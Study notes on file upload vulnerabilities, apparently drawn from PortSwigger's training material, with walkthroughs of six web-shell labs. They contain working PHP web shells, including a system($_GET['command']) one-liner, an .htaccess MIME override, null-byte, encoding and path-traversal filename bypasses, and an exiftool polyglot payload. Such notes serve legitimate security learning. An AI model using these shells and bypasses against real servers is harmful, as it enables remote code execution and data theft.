# File Upload Vulnerabilities

[Portswigger](https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities)

## Methodology

Hint: The Content-Type response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping

the following PHP one-liner could be used to read arbitrary files from the server's filesystem `<?php echo file_get_contents('/path/to/target/file'); ?>` 
or `<?php echo system($_GET['command']); ?>` 

### Flawed file input type validation

Example HTML form request:

```
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

if input validation only applies to the first part of the `form-data` you can change the data types and get execution like that, notice the two different `Content-Type`s above

### Preventing file execution in user-accessible directories

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead

Tip: Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved

### Insufficient blacklisting of dangerous file types

Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, .shtml, and so on

### Overriding the server configuration

you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type. 

examples:

Apache added as `.htaccess`

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

IIS added as web.config

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```

### Obfuscating file extensions

steps to obfuscate

- case sensitive bypassing like `exploit.pHp`
- provide multiple extensions `exploit.php.jpg`
- add trailing characters `exploit.php.`
- try using URL encoding, or double URL encoding for dots, forward slashes, and backward slashes `exploit%2Ephp`
  - If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked
- Add semicolons or URL-encoded null byte characters before the file extension `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- try using multibyte unicode characters which may be converted to null bytes and dots after unicode conversion or normalization like: `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path
- other defenses may strip or replace dangerous extensions, do this to maybe avoid: `exploit.p.phphp`

### Flawed validation of the file's contents

Instead of implicitly trusting the Content-Type specified in a request, more secure servers try to verify that the contents of the file actually match what is expected

certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata

### Exploiting file upload vulnerabilities without remote code execution

**Uploading malicious client-side scripts**

if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads

**Exploiting vulnerabilities in the parsing of uploaded files**

example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks

### Uploading files using PUT

some web servers may be configured to support PUT requests, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface

Tip: You can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method.

## Labs walkthrough

### Remote code execution via web shell upload

Background: 

```
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
```

- log into your account, notice the option for uploading an avatar image
- upload an arbitrary image and notice that afterwards your preview of your avatar is now displayed on the page
- in `Proxy > HTTP history` click the filter bar to open the `HTTP history filter` window, under the `Filter by MIME type` enable the `images` checkbox then apply the changes
- no in burp history search for the `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
- now on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- use the avatar upload functionality to upload the above file, then in the repeater tab change the path to `GET /files/avatars/exploit.php HTTP/1.1` and send
- you will now have carlos' secret in the response

### Web shell upload via Content-Type restriction bypass

Background:

```
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
```

- log in and upload an image as your avatar, go to your account page
- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- attempt to upload this script as your avatar but notice you get blocked, with an error saying only files with MIME type `image/jpeg` or `image/png`
- in burp go to history and send the `POST /my-account/avatar` request to repeater
- change the `content-type` to `image/jpeg` and send
- switch to the `GET` request in repeater and send to get the info for carlos' secret

### Web shell upload via path traversal

Background:

```
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
```

- log in and upload an image as your avatar, then go back to the account page
- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- upload the script and notice you don't get blocked based on it being a php file
- in repeater go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request, in the path replace the name of your image file with exploit.php and send the request, observe that instead of executing the script and returning output, it just served it as a txt file
- in burps history find the `POST /my-account/avatar` and send it to repeater
- change the `POST /my-account/avatar` requests `Content-Disposition` headers `filename` to include a directory traversal sequence: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
- upload and notice the response `The file avatars/exploit.php has been uploaded`, this means the directory traversal was stripped
- now obfuscate the directory traversal with URL encoding the slash character `/`: `filename="..%2fexploit.php"`
- send the request and observe that the message now says: `The file avatars/../exploit.php has been uploaded`, inidcating the file name is being URL decoded by the server
- go back to your account page
- find the `GET /files/avatars/..%2fexploit.php` and observe that carlos' secret was returned in the response

### Web shell upload via extension blacklist bypass

Background:

```
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
Hint: You need to upload two different files to solve this lab
```

- log in and upload an image as your avatar, then go back to the account page
- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- attempt to upload this script as your avatar, you get blocked because it is a `.php` file extension
- in burp history look for the `POST /my-account/avatar` and send it to repeater
- in repeater find the part of the body that relates to your PHP file, make the following changes
  - Change the value of the `filename` parameter to `.htaccess`
  - Change the value of the `Content-Type` header to `text/plain`
  - Replace the contents of the file (your PHP payload) with the following Apache directive: `AddType application/x-httpd-php .l33t`
- send the request and see that it was successful
- use burp repeater to return to the original request for uploading you PHP exploit and change the value of the filename parameter from `exploit.php` to `exploit.l33t` send the request again and notice that it was successful
- switch to the repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` change the path to ``exploit.l33t` and send it and get carlos' secret in the response

### Web shell upload via obfuscated file extension

Background:

```
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
```

- log in and upload an image as your avatar, then go back to the account page
- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- attempt to upload and see that it is blocked because it isn't a JPG or PNG file
- in proxy history find the `POST /my-account/avatar` and send to repeater
- in the above repeater tab change the `filename` parameter in the `Content-Disposition` header like so: `filename="exploit.php%00.jpg"`
- send the request and observe that the file was successfully uploaded and the message referes to the file as `exploit.php` suggesting that the null byte and `.jpg` extension have been stripped
- switch back to the `GET /files/avatars/<YOUR-IMAGE>` request and change the path to `exploit.php` and send to get carlos' secret

### Remote code execution via polyglot web shell upload

Background:

```
This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
```

- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- log in and attempt to upload the script as your avatar, observe that this gets blocked
- create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata using the exiftool: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
- in your browser attempt to upload this polyglot file as your avatar, and go back to your account page
- in burps history find the `GET /files/avatars/polyglot.php` and use the message editor's search feature to find the `START` string somewhere within the binary image data in the response, between the `END` string you should see carlos' secret like so: `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`

